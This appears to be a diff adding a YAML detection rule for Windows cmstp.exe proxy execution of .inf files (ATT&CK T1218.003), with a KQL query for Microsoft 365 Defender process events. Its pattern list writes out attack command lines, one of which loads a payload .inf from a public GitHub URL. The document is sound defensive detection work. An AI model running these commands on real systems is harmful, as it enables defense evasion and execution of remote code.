@@ -1,0 +1,35 @@
+---
+title: cmstp_p1000_executing_inf_file
+metaData:
+  description: installs a specially formatted .inf
+  detectUseCase:
+  detectType: single_line_match
+  detectCon: 3
+  tags:
+    - lol
+intel:
+  attackTechnique: t1218.003
+  attackSoftware:
+  references:
+  emulation:
+    - atomic_red_team_t1218_003_t1_guid_34e63321-9683-496b-bbc1-7566bc55e624
+    - atomic_red_team_t1218_003_t2_guid_748cb4f6-2fb3-4e97-b7ad-b22635a09ab0
+  pattern:
+    - cmstp.exe /s path\to\some_file.inf /au
+    - cmstp.exe /s path\to\some_file.inf
+    - cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
+    - cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
+dataRequirements:
+  dataScope: endpoint_windows_os
+  dataCollector: m365d_agent
+  dataName: process_creation
+  dataForwardTo: m365d_security_center
+  dataAccess: m365d_advanced_hunting_api
+  dataStorage: device_process_events
+  dataMap: device_process_events
+kqlDetect:
+  kqlVar:
+  kqlTable: DeviceProcessEvents
+  kqlQuery: | 
+    | where ProcessCommandLine has 'cmstp'
+    | where ProcessCommandLine contains '.inf'
